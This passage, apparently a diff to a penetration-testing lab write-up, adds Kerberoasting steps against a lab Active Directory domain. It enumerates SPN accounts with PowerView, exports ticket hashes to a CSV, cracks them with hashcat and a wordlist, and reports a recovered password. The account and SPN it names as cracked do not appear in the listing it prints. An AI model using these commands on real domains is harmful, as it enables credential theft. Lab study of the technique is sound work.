@@ -779,3 +779,31 @@ We now can also use PowerView to get a list of users that can be kerberoasted wi
 ```
 Get-DomainUser * -SPN |Select samaccountname
 ```
+which gives us 
+```
+samaccountname
+--------------
+azureconnect
+backupjob
+krbtgt
+mssqlsvc
+sqltest
+sqlqa
+sqldev
+mssqladm
+svc_sql
+sqlprod
+sapsso
+sapvc
+vmwarescvc
+```
+We then can copy the password hashes for these SPNs using PowerView to a .csv file with the following command:
+```
+Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
+```
+We download the file to our attack box and use LibreOffice or equivalent to open the .csv file. We copy/paste the hashes to a separate text file and run hashcat:
+```
+hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
+```
+After it runs, we see that we get the password "lucky7" for the user backupjob01 and SPN veem001, however upon searching BloodHound this account does not seem to be useful.
+
